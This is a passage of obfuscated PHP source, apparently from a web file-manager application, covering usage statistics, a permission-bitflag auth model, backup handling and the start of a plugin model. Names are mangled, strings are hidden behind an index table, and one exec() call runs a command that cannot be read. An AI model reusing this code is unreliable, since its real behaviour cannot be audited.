$b»§¡Î¯©Ó), $E˜ë¯¶‚Ğ[2033] => (int) $b»§¡Î¯©Ó, $E˜ë¯¶‚Ğ[2034] => (int) $bã¶—ª…Ó, $E˜ë¯¶‚Ğ[2035] => $cµŒé‘´Â´); goto aÕÉ©Ô·æ«; Aµé¹Õ‘©·: if (!$cµŒé‘´Â´) { $cµŒé‘´Â´ = 1; } $fÄèÇø¥ïÅ = strtotime(date($E˜ë¯¶‚Ğ[2010])); $dÎéÃ®‰‚‘ = array($E˜ë¯¶‚Ğ[2031] => array($E˜ë¯¶‚Ğ[922], $fÄèÇø¥ïÅ)); goto aïÃŸç½³; B…ïÕ¹Ê¾ˆ: $fÄèÇø¥ïÅ = strtotime($E˜ë¯¶‚Ğ[2030]); $dÎéÃ®‰‚‘ = array($E˜ë¯¶‚Ğ[2031] => array($E˜ë¯¶‚Ğ[922], $fÄèÇø¥ïÅ)); $cµŒé‘´Â´ = (int) Model($E˜ë¯¶‚Ğ[473])->where($dÎéÃ®‰‚‘)->count($E˜ë¯¶‚Ğ[1409]); goto Aµé¹Õ‘©·; aÕÉ©Ô·æ«: } private function optionFile() { goto dŠ»‚à¬†¸; cšªè¢¬…„: $a‰¯ôåÄº¹ = Model($CÒ‘¨‰‡[747])->where($aÏøçÒ„¥¨)->sum($CÒ‘¨‰‡[77]); $DøÉÛàº¸Ó = Model($CÒ‘¨‰‡[747])->where($aÏøçÒ„¥¨)->count($CÒ‘¨‰‡[366]); return array($CÒ‘¨‰‡[693] => $a˜¾…ÍÕˆÉ, $CÒ‘¨‰‡[2003] => $a¾ÜÂ’òÎ“, $CÒ‘¨‰‡[2036] => $a˜¾…ÍÕˆÉ - $a¾ÜÂ’òÎ“, $CÒ‘¨‰‡[2037] => (int) $a‰¯ôåÄº¹, $CÒ‘¨‰‡[695] => (int) $F‡„îÚÓ…Ò, $CÒ‘¨‰‡[2038] => (int) $DøÉÛàº¸Ó); goto aØæéïÆßÌ; fëù´ËÒ—õ: $a¾ÜÂ’òÎ“ = $C¥Éª¤ìÉ[$CÒ‘¨‰‡[2003]]; $F‡„îÚÓ…Ò = Model($CÒ‘¨‰‡[747])->where(array($CÒ‘¨‰‡[367] => 0))->count($CÒ‘¨‰‡[366]); $aÏøçÒ„¥¨ = array($CÒ‘¨‰‡[367] => 0, $CÒ‘¨‰‡[184] => array($CÒ‘¨‰‡[922], strtotime(date($CÒ‘¨‰‡[2010])))); goto cšªè¢¬…„; dŠ»‚à¬†¸: $CÒ‘¨‰‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C¥Éª¤ìÉ = $this->sourceSize(); $a˜¾…ÍÕˆÉ = $C¥Éª¤ìÉ[$CÒ‘¨‰‡[77]]; goto fëù´ËÒ—õ; aØæéïÆßÌ: } private function optionAccess() { $fó½•¡¦º² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($fó½•¡¦º²[690] => $this->typeLogCnt(), $fó½•¡¦º²[91] => $this->typeLogCnt($fó½•¡¦º²[91]), $fó½•¡¦º²[400] => $this->typeLogCnt($fó½•¡¦º²[400]), $fó½•¡¦º²[2039] => $this->typeLogCnt($fó½•¡¦º²[2039]), $fó½•¡¦º²[2040] => $this->typeLogCnt($fó½•¡¦º²[2040]), $fó½•¡¦º²[531] => $this->typeLogCnt($fó½•¡¦º²[33], $fó½•¡¦º²[2014])); } private function typeLogCnt($B÷Ö—ö¦•š = '', $càæâÛ… = "\151\x64") { goto cõ¸Úõ½§Ë; cõ¸Úõ½§Ë: $aá¬Û÷¥¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÑù½ÙÕ = array($aá¬Û÷¥¸[91] => array($aá¬Û÷¥¸[2041], $aá¬Û÷¥¸[2042]), $aá¬Û÷¥¸[400] => array($aá¬Û÷¥¸[2043], $aá¬Û÷¥¸[2044]), $aá¬Û÷¥¸[2039] => array($aá¬Û÷¥¸[2045], $aá¬Û÷¥¸[2046]), $aá¬Û÷¥¸[2040] => array($aá¬Û÷¥¸[2047], $aá¬Û÷¥¸[2048]), $aá¬Û÷¥¸[2049] => array($aá¬Û÷¥¸[2050], $aá¬Û÷¥¸[2051], $aá¬Û÷¥¸[2052])); $A„®ëÍ’– = strtotime(date($aá¬Û÷¥¸[2010])); goto AŞÒæ™èá ; f¥À¶ˆĞÚ: return (int) $BˆÀ¢”¢Ãã; goto b–ù¿šêÏ; AŞÒæ™èá : $bƒóåÃ¾öÔ = array($aá¬Û÷¥¸[184] => array($aá¬Û÷¥¸[922], $A„®ëÍ’–)); if ($B÷Ö—ö¦•š) { $bƒóåÃ¾öÔ[$aá¬Û÷¥¸[29]] = array($aá¬Û÷¥¸[7], $eÑù½ÙÕ[$B÷Ö—ö¦•š]); } $BˆÀ¢”¢Ãã = Model($aá¬Û÷¥¸[2013])->where($bƒóåÃ¾öÔ)->count($càæâÛ…); goto f¥À¶ˆĞÚ; b–ù¿šêÏ: } private function optionServer() { goto BŒİÌ§ùøÎ; d°ËÄƒÌ–œ: if ($c•™º†Ä¿ == $e–õ…ë¤ÙÒ[719]) { $DšÁˆŒğç˜ = explode($e–õ…ë¤ÙÒ[1068], $c·Ãêªİ›ë[$e–õ…ë¤ÙÒ[881]]); $c•™º†Ä¿ = $DšÁˆŒğç˜[0]; } if ($c•™º†Ä¿ == $e–õ…ë¤ÙÒ[722] || $c•™º†Ä¿ == $e–õ…ë¤ÙÒ[723]) { $FİºåÄ–¶­ = Model()->db()->query($e–õ…ë¤ÙÒ[2053]); $fªï‡ÅÔÓ° = $FİºåÄ–¶­[0] && isset($FİºåÄ–¶­[0][$e–õ…ë¤ÙÒ[1315]]) ? $FİºåÄ–¶­[0][$e–õ…ë¤ÙÒ[1315]] : 0; $c•™º†Ä¿ = $e–õ…ë¤ÙÒ[2054] . ($fªï‡ÅÔÓ° ? $e–õ…ë¤ÙÒ[8] . $fªï‡ÅÔÓ° : $e–õ…ë¤ÙÒ[33]); } $C”×ôâË»ä = $GLOBALS[$e–õ…ë¤ÙÒ[6]][$e–õ…ë¤ÙÒ[334]][$e–õ…ë¤ÙÒ[748]]; goto bŸ‘‚¶Ì†; CˆÆ‹¿Óí³: $BÙÚÔğø¹ = array($e–õ…ë¤ÙÒ[738] => $AóŸÍ‹’Ú[$e–õ…ë¤ÙÒ[364]]); $FãÜô¼èŒŒ = Model($e–õ…ë¤ÙÒ[418])->where($BÙÚÔğø¹)->sum($e–õ…ë¤ÙÒ[77]); $D”†æö‚Í– = explode($e–õ…ë¤ÙÒ[50], $_SERVER[$e–õ…ë¤ÙÒ[138]]); goto A‹êäë…ë¿; bŸ‘‚¶Ì†: return array($e–õ…ë¤ÙÒ[2055] => $BöÙÜÃ…È ? $BöÙÜÃ…È[$e–õ…ë¤ÙÒ[2056]] : 0, $e–õ…ë¤ÙÒ[2057] => $BöÙÜÃ…È ? $BöÙÜÃ…È[$e–õ…ë¤ÙÒ[2058]] : 0, $e–õ…ë¤ÙÒ[2059] => (int) $AóŸÍ‹’Ú[$e–õ…ë¤ÙÒ[2056]] * 1024 * 1024 * 1024, $e–õ…ë¤ÙÒ[2060] => (int) $FãÜô¼èŒŒ, $e–õ…ë¤ÙÒ[2061] => ucfirst($CĞ”È¿Ì«è), $e–õ…ë¤ÙÒ[2062] => $e–õ…ë¤ÙÒ[2063] . PHP_VERSION, $e–õ…ë¤ÙÒ[2064] => phpBuild64() ? 64 : 32, $e–õ…ë¤ÙÒ[689] => str_replace($e–õ…ë¤ÙÒ[2065], $e–õ…ë¤ÙÒ[898], $c•™º†Ä¿), $e–õ…ë¤ÙÒ[334] => ucfirst($C”×ôâË»ä), $e–õ…ë¤ÙÒ[28] => $_SERVER[$e–õ…ë¤ÙÒ[2066]]); goto cº×¶ôÕïÕ; BŒİÌ§ùøÎ: $e–õ…ë¤ÙÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BöÙÜÃ…È = $this->diskDriver(); $AóŸÍ‹’Ú = KodIO::defaultDriver(); goto CˆÆ‹¿Óí³; A‹êäë…ë¿: $CĞ”È¿Ì«è = $D”†æö‚Í–[0]; $c·Ãêªİ›ë = $GLOBALS[$e–õ…ë¤ÙÒ[6]][$e–õ…ë¤ÙÒ[17]]; $c•™º†Ä¿ = $c·Ãêªİ›ë[$e–õ…ë¤ÙÒ[882]]; goto d°ËÄƒÌ–œ; cº×¶ôÕïÕ: } private function diskDriver() { goto D†Í”°ğç®; D†Í”°ğç®: $d­ÂÃÊ¬Ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÀ½×í»ñ± = $d­ÂÃÊ¬Ê[8]; $b¿ÍÇ×´ÚÜ = $GLOBALS[$d­ÂÃÊ¬Ê[6]][$d­ÂÃÊ¬Ê[2067]] == $d­ÂÃÊ¬Ê[2068]; goto D­±¿°Ë¢; eï³‡¥™©Á: $bÜ ÷”ÁëÛ = $f—öİš’”Æ - @disk_free_space($EÀ½×í»ñ±); return array($d­ÂÃÊ¬Ê[2056] => $f—öİš’”Æ, $d­ÂÃÊ¬Ê[2058] => $bÜ ÷”ÁëÛ); goto eñ÷›Ğñ™; D­±¿°Ë¢: if ($b¿ÍÇ×´ÚÜ) { $EÀ½×í»ñ± = $d­ÂÃÊ¬Ê[2069]; if (function_exists($d­ÂÃÊ¬Ê[2070])) { exec($d­ÂÃÊ¬Ê[2071], $bÑ¨¶ƒ°½º); $EÀ½×í»ñ± = $bÑ¨¶ƒ°½º[1] . $d­ÂÃÊ¬Ê[8]; } } if (!file_exists($EÀ½×í»ñ±)) { return; } $f—öİš’”Æ = @disk_total_space($EÀ½×í»ñ±); goto eï³‡¥™©Á; eñ÷›Ğñ™: } public function fileChart($DÃÁä•İª¹) { goto aÒÔ´¼ÙÂ; CæØ¼¦Ùè‡: $Dèòâ¾”ĞÖ = $this->sourceSize(); $BÙ¥®İÃÖ = array($CÒº­ò¡¬‘[457] => 0, $CÒº­ò¡¬‘[368] => 1); $e°âø©‹ÒÖ = Model($CÒº­ò¡¬‘[747])->where($BÙ¥®İÃÖ)->sum($CÒº­ò¡¬‘[77]); goto C…ääƒ‘‚; aÒÔ´¼ÙÂ: $CÒº­ò¡¬‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($DÃÁä•İª¹[$CÒº­ò¡¬‘[1409]])) { return Model($CÒº­ò¡¬‘[747])->userFileTypeProfile($DÃÁä•İª¹[$CÒº­ò¡¬‘[1409]]); } if (isset($DÃÁä•İª¹[$CÒº­ò¡¬‘[2072]])) { return Model($CÒº­ò¡¬‘[747])->groupFileTypeProfile($DÃÁä•İª¹[$CÒº­ò¡¬‘[2072]]); } goto CæØ¼¦Ùè‡; C…ääƒ‘‚: $BÙ¥®İÃÖ[$CÒº­ò¡¬‘[368]] = 2; $C°ÓèËÒİœ = Model($CÒº­ò¡¬‘[747])->where($BÙ¥®İÃÖ)->sum($CÒº­ò¡¬‘[77]); return array($CÒº­ò¡¬‘[693] => $Dèòâ¾”ĞÖ[$CÒº­ò¡¬‘[77]], $CÒº­ò¡¬‘[2003] => $Dèòâ¾”ĞÖ[$CÒº­ò¡¬‘[2003]], $CÒº­ò¡¬‘[2004] => (int) $e°âø©‹ÒÖ, $CÒº­ò¡¬‘[2005] => (int) $C°ÓèËÒİœ); goto eò‡İ¾ô•¯; eò‡İ¾ô•¯: } private function sourceSize() { $FèÚ«…£Š£ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D’²•Ô‡Ÿ = Model($FèÚ«…£Š£[747])->where(array($FèÚ«…£Š£[367] => 0))->sum($FèÚ«…£Š£[77]); $c¿¹İò§Çô = Model($FèÚ«…£Š£[418])->sum($FèÚ«…£Š£[77]); if ($c¿¹İò§Çô > $D’²•Ô‡Ÿ) { $c¿¹İò§Çô = $D’²•Ô‡Ÿ; } return array($FèÚ«…£Š£[77] => (int) $D’²•Ô‡Ÿ, $FèÚ«…£Š£[2003] => (int) $c¿¹İò§Çô); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $dŒ¼íá©º =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dìíŸÛ ÉÑ = array(array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2073]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2075], $dŒ¼íá©º[2076] => 6, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2079]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2080], $dŒ¼íá©º[2076] => 1, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2081]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2082], $dŒ¼íá©º[2076] => 2, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2083]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2082], $dŒ¼íá©º[2076] => 3, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2084]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2085], $dŒ¼íá©º[2076] => 4, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => self::AUTH_SHOW | self::AUTH_VIEW), array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2086]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2087], $dŒ¼íá©º[2076] => 5, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($dŒ¼íá©º[383] => LNG($dŒ¼íá©º[2088]), $dŒ¼íá©º[2074] => $dŒ¼íá©º[2089], $dŒ¼íá©º[2076] => 7, $dŒ¼íá©º[2077] => 1, $dŒ¼íá©º[2078] => 0)); return $dìíŸÛ ÉÑ; } public static function authCheck($B–Á¿ÊèÄ², $C¹Ê°ù½Û´) { $B–Á¿ÊèÄ² = intval($B–Á¿ÊèÄ²); if (_get($GLOBALS, $_SERVER[ÚŠ•´ÍéÒÑÔ][453])) { return !0; } if ($B–Á¿ÊèÄ² <= 0) { return !1; } if (($B–Á¿ÊèÄ² & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($B–Á¿ÊèÄ² & $C¹Ê°ù½Û´); } public static function authCheckShow($EËÏĞ½ˆ‹) { return self::authCheck($EËÏĞ½ˆ‹, self::AUTH_SHOW); } public static function authCheckView($aª²Ù¼Š„Ä) { return self::authCheck($aª²Ù¼Š„Ä, self::AUTH_VIEW); } public static function authCheckDownload($a£İ”¢ ™ƒ) { return self::authCheck($a£İ”¢ ™ƒ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($a‡¿öƒËê) { return self::authCheck($a‡¿öƒËê, self::AUTH_UPLOAD); } public static function authCheckEdit($fàƒ±©œ¥Ë) { return self::authCheck($fàƒ±©œ¥Ë, self::AUTH_EDIT); } public static function authCheckRemove($EÀ¥ñÄåÚ‹) { return self::authCheck($EÀ¥ñÄåÚ‹, self::AUTH_REMOVE); } public static function authCheckShare($FÂã¡ô™) { return self::authCheck($FÂã¡ô™, self::AUTH_SHARE); } public static function authCheckComment($EöÕ­æÌœŒ) { return self::authCheck($EöÕ­æÌœŒ, self::AUTH_COMMENT); } public static function authCheckEvent($Fîæ¹öğ°’) { return self::authCheck($Fîæ¹öğ°’, self::AUTH_EVENT); } public static function authCheckRoot($DÜªÑªà©Ä) { return self::authCheck($DÜªÑªà©Ä, self::AUTH_ROOT); } public static function authDisable($bšÜİ°“ŞÃ, $bÙˆ½Á£˜¼) { if (intval($bšÜİ°“ŞÃ) <= 0) { return 0; } return intval($bšÜİ°“ŞÃ) & ~$bÙˆ½Á£˜¼; } public $optionType = "\123\x79\163\164\145\155\x2e\x73\x6f\165\162\143\145\x41\x75\x74\x68\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x61\x75\x74\150", "\154\x61\x62\x65\154", "\x64\x69\163\x70\x6c\141\x79", "\163\171\x73\x74\145\x6d", "\163\x6f\x72\164"); public function initData() { $d†Ã‡šÖ÷¶ = $this->authDefault(); foreach ($d†Ã‡šÖ÷¶ as $a¢ç¾ªëô¿) { $this->add($a¢ç¾ªëô¿); } } public function listData($f”‰¢¤Ã‚´ = false, $bõ©ª¨ß¶Ä = "\x73\157\x72\x74", $CáùÌã³Ï¬ = false) { return parent::listData($f”‰¢¤Ã‚´, $bõ©ª¨ß¶Ä, $CáùÌã³Ï¬); } public function update($aÈèò­£”š, $bÅª®Ô„Å) { $B»¡¥ó¤È¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dùà‰Ù´ = parent::listData($aÈèò­£”š); $D‡ŒÏç‚ÉÛ = $this->findByName($bÅª®Ô„Å[$B»¡¥ó¤È¥[28]]); if (!$dùà‰Ù´ || $D‡ŒÏç‚ÉÛ && $D‡ŒÏç‚ÉÛ[$B»¡¥ó¤È¥[364]] != $dùà‰Ù´[$B»¡¥ó¤È¥[364]]) { return !1; } $this->filterAuth($bÅª®Ô„Å[$B»¡¥ó¤È¥[373]]); return parent::update($aÈèò­£”š, $bÅª®Ô„Å); } public function remove($f³”ì¤ö) { $BØÁÀŠ‡…Ø = parent::listData($f³”ì¤ö); if (!$BØÁÀŠ‡…Ø || $BØÁÀŠ‡…Ø[$_SERVER[ÚŠ•´ÍéÒÑÔ][1072]]) { return !1; } return parent::remove($f³”ì¤ö); } public function add($bÊ¤õ½”˜¯ = array()) { goto D«Ëà¬ùÈ×; D«Ëà¬ùÈ×: $AÜ“Ò¿à‡  =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->findByName($bÊ¤õ½”˜¯[$AÜ“Ò¿à‡ [28]])) { return !1; } $D¶ÇÈèì¥ = array($AÜ“Ò¿à‡ [28] => $AÜ“Ò¿à‡ [33], $AÜ“Ò¿à‡ [373] => 1, $AÜ“Ò¿à‡ [2090] => $AÜ“Ò¿à‡ [2091], $AÜ“Ò¿à‡ [2092] => 1, $AÜ“Ò¿à‡ [1072] => 0, $AÜ“Ò¿à‡ [2093] => 0); goto E›ÚìÛßÆ; E›ÚìÛßÆ: $bÊ¤õ½”˜¯ = array_merge($D¶ÇÈèì¥, $bÊ¤õ½”˜¯); $bÊ¤õ½”˜¯[$AÜ“Ò¿à‡ [2093]] = $this->getSort(); $this->filterAuth($bÊ¤õ½”˜¯[$AÜ“Ò¿à‡ [373]]); goto bœœˆ®³Õà; bœœˆ®³Õà: return parent::insert($bÊ¤õ½”˜¯); goto e›´«¿Ş„; e›´«¿Ş„: } private function getSort() { $Dë±òØÊÈç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BŒĞÀ³¥µè = parent::listData(); $d§È¯ï¶¶ = array_to_keyvalue($BŒĞÀ³¥µè, $Dë±òØÊÈç[33], $Dë±òØÊÈç[2093]); return empty($d§È¯ï¶¶) ? 0 : max($d§È¯ï¶¶) + 1; } private function filterAuth(&$Dµ¢Áâ„Ëá) { goto Aîêä„¦ã¿; cÀ•˜ô¾º¼: foreach ($dğ’Ê³¤— as $a¡¾–‹Å¨¬) { if ($Dµ¢Áâ„Ëá & $a¡¾–‹Å¨¬) { $C¾ãğòé”‘[] = $a¡¾–‹Å¨¬; } } if (in_array(self::AUTH_ROOT, $C¾ãğòé”‘)) { $Dµ¢Áâ„Ëá = array_sum($dğ’Ê³¤—); return; } $CÄ—é¸ÄîÜ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto A»·ŞÕõø; Aîêä„¦ã¿: if (!$Dµ¢Áâ„Ëá) { return; } $dğ’Ê³¤— = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $C¾ãğòé”‘ = array(); goto cÀ•˜ô¾º¼; A»·ŞÕõø: foreach ($C¾ãğòé”‘ as $a¡¾–‹Å¨¬) { if (isset($CÄ—é¸ÄîÜ[$a¡¾–‹Å¨¬])) { $C¾ãğòé”‘ = array_merge($C¾ãğòé”‘, $CÄ—é¸ÄîÜ[$a¡¾–‹Å¨¬]); } } $C¾ãğòé”‘[] = self::AUTH_SHOW; $Dµ¢Áâ„Ëá = array_sum(array_unique($C¾ãğòé”‘)); goto aóôŸ²ÚÁ; aóôŸ²ÚÁ: } public function sort($eë´Ô¢ŠĞæ, $B¿ÓÚÕµ›Û) { return parent::update($eë´Ô¢ŠĞæ, $B¿ÓÚÕµ›Û); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x62\x61\143\153\165\160\x4c\151\163\x74"; public $field = array("\x69\x6f", "\x6e\141\155\145", "\163\164\141\x74\165\163", "\143\157\x6e\164\x65\156\164", "\162\x65\x73\x75\x6c\164", "\164\x69\x6d\x65\x46\x72\157\155", "\164\151\x6d\145\x54\157"); public function config() { goto Cäİ´”¬‘¡; Cäİ´”¬‘¡: $DøÊ‰å®Šô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C“‡¿œ»è¡ = Model($DøÊ‰å®Šô[1080])->get($DøÊ‰å®Šô[707]); $C“‡¿œ»è¡ = json_decode($C“‡¿œ»è¡, !0); goto aé°é°í«¶; aé°é°í«¶: $C“‡¿œ»è¡ = is_array($C“‡¿œ»è¡) ? $C“‡¿œ»è¡ : array(); if (!isset($C“‡¿œ»è¡[$DøÊ‰å®Šô[687]])) { $C“‡¿œ»è¡[$DøÊ‰å®Šô[687]] = $DøÊ‰å®Šô[464]; } $C½¥Ëƒ»çÅ = array(); goto CÒÄÔÄº¡ˆ; CÒÄÔÄº¡ˆ: Action($DøÊ‰å®Šô[2094])->taskInit(); $CÜ‰ò±ƒ = Model($DøÊ‰å®Šô[2095])->listData(); foreach ($CÜ‰ò±ƒ as $eÖàöò®Ö) { if ($eÖàöò®Ö[$DøÊ‰å®Šô[1072]] == $DøÊ‰å®Šô[83] && $eÖàöò®Ö[$DøÊ‰å®Šô[1397]] == $DøÊ‰å®Šô[2096]) { $C½¥Ëƒ»çÅ = $eÖàöò®Ö; break; } } goto bØŠ§­·ìô; bØŠ§­·ìô: if (isset($C½¥Ëƒ»çÅ[$DøÊ‰å®Šô[187]])) { $C½¥Ëƒ»çÅ[$DøÊ‰å®Šô[187]] = json_decode($C½¥Ëƒ»çÅ[$DøÊ‰å®Šô[187]], !0); } if (isset($C“‡¿œ»è¡[$DøÊ‰å®Šô[187]])) { $C½¥Ëƒ»çÅ[$DøÊ‰å®Šô[187]][$DøÊ‰å®Šô[1384]] = $C“‡¿œ»è¡[$DøÊ‰å®Šô[187]]; unset($C“‡¿œ»è¡[$DøÊ‰å®Šô[187]]); } return array_merge($C½¥Ëƒ»çÅ, $C“‡¿œ»è¡); goto EÄéô™ºÅÀ; EÄéô™ºÅÀ: } public function listData($bå°áóÈÈ = false, $aŒ¶¶Üçí˜ = "\x6d\x6f\x64\151\x66\x79\124\151\155\x65", $Fæš´Şƒ = false) { return parent::listData($bå°áóÈÈ, $aŒ¶¶Üçí˜, !0); } public function lastItem() { $e‘ĞÔ°‰¬İ = $this->listData(); return !empty($e‘ĞÔ°‰¬İ[0]) ? $e‘ĞÔ°‰¬İ[0] : null; } public function kill($b¼„è‡µ) { goto FÆ½êãË½; FÆ½êãË½: $b¥Ñóğêœ‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a‘«ìÚĞ›Ñ = $this->listData($b¼„è‡µ); if (!$a‘«ìÚĞ›Ñ || empty($a‘«ìÚĞ›Ñ[$b¥Ñóğêœ‘[28]])) { return !0; } goto f‚Ìº‚İø; f‚Ìº‚İø: Task::kill($b¥Ñóğêœ‘[706]); Task::kill($b¥Ñóğêœ‘[724]); Task::kill($b¥Ñóğêœ‘[731]); goto eŒ äóùÚ; d‚Şà¸–ùÑ: return $this->remove($b¼„è‡µ); goto Eã´½¬æÄ; eŒ äóùÚ: $DÙ™ç’ŒÊ¬ = $a‘«ìÚĞ›Ñ[$b¥Ñóğêœ‘[28]]; $AùæÆ‡÷™ = TEMP_FILES . $b¥Ñóğêœ‘[705] . $DÙ™ç’ŒÊ¬ . $b¥Ñóğêœ‘[8]; IO::remove($AùæÆ‡÷™, !1); goto d‚Şà¸–ùÑ; Eã´½¬æÄ: } public function remove($cÇšÄ³Çç®) { $A£Ë‚æ’ç¯ = $this->listData($cÇšÄ³Çç®); if (!$A£Ë‚æ’ç¯) { return !0; } return $this->backupRemove($A£Ë‚æ’ç¯); } private function backupRemove($F›…«Ş›Ù) { $D­–’õòøÜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; parent::remove($F›…«Ş›Ù[$D­–’õòøÜ[364]]); $b¸ğ…èÀ´ = "\x7b\151\157\72{$F›…«Ş›Ù[$D­–’õòøÜ[686]]}\175\57\144\141\164\x61\x62\x61\x73\145\57\x62\141\x63\x6b\x75\160\x5f" . $F›…«Ş›Ù[$D­–’õòøÜ[28]]; IO::remove($b¸ğ…èÀ´, !1); return !0; } public function start() { goto E±»„ÑÚ¶Â; F½¥öËËÃ: return !0; goto dÄ•ºÙ£Ë§; A©×‘‹õ‚: if (!$d«ëô´ÊˆÏ->dbFile()) { return !1; } if ($cÈ¸„´Ñà±[$D±ÓÅÜ¶Å‡[687]] == $D±ÓÅÜ¶Å‡[464]) { $d«ëô´ÊˆÏ->file(); } Backup::set(array($D±ÓÅÜ¶Å‡[684] => 1, $D±ÓÅÜ¶Å‡[698] => time())); goto F½¥öËËÃ; C§¼®¯âß: $d«ëô´ÊˆÏ = new Backup(); $d«ëô´ÊˆÏ->keep(); if (!$d«ëô´ÊˆÏ->db()) { return !1; } goto A©×‘‹õ‚; E±»„ÑÚ¶Â: $D±ÓÅÜ¶Å‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($GLOBALS[$D±ÓÅÜ¶Å‡[6]][$D±ÓÅÜ¶Å‡[84]][$D±ÓÅÜ¶Å‡[2097]] != $D±ÓÅÜ¶Å‡[83]) { return !0; } $cÈ¸„´Ñà± = $this->config(); goto a¾¢ÀØ¦·ç; a¾¢ÀØ¦·ç: if (!$cÈ¸„´Ñà± || $cÈ¸„´Ñà±[$D±ÓÅÜ¶Å‡[1381]] != $D±ÓÅÜ¶Å‡[83]) { return !1; } $Fœ»¸Æˆçˆ = $this->process(); foreach ($Fœ»¸Æˆçˆ as $Dò»Ç»ëÇ) { if ($Dò»Ç»ëÇ) { return Task::restart($Dò»Ç»ëÇ[$D±ÓÅÜ¶Å‡[364]]); } } goto C§¼®¯âß; dÄ•ºÙ£Ë§: } public function process() { $aØ »£¾… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($aØ »£¾…[689] => Task::get($aØ »£¾…[706]), $aØ »£¾…[692] => Task::get($aØ »£¾…[724]), $aØ »£¾…[164] => Task::get($aØ »£¾…[731])); } public function restore() { $f¸å­ì±Å„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; ActionCall($f¸å­ì±Å„[2098], !0, 1); ActionCall($f¸å­ì±Å„[2098], !0, 0); } } goto b‹Œ»ÏÃã; AÅœÑŠô: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x70\154\165\x67\151\x6e\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\163\x74\141\x74\x75\163", "\x72\145\x67\151\145\163\164", "\x63\x6f\x6e\x66\x69\147"); public function loadList($fæèäÕå»… = false) { $f¡«ÔĞƒ‚ = array_to_keyvalue($this->listData(), $_SERVER[ÚŠ•´ÍéÒÑÔ][28]); if ($fæèäÕå»…) { return $f¡«ÔĞƒ‚[$fæèäÕå»…]; } return $f¡«ÔĞƒ‚; } public function init() { $eˆ˜¥ÇÜà =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Hook::trigger($eˆ˜¥ÇÜà[2160]); $eõ£¨„ä‚ = $this->loadPluginList(); foreach ($eõ£¨„ä‚ as $c¸ƒªªöâ => $aÚ‘Ê§†) { $cÄ‘’Ñ‰Ò‘ = $this->appAllow($c¸ƒªªöâ, $aÚ‘Ê§†); if (!$cÄ‘’Ñ‰Ò‘) { continue; } foreach ($aÚ‘Ê§†[$eˆ˜¥ÇÜà[2161]] as 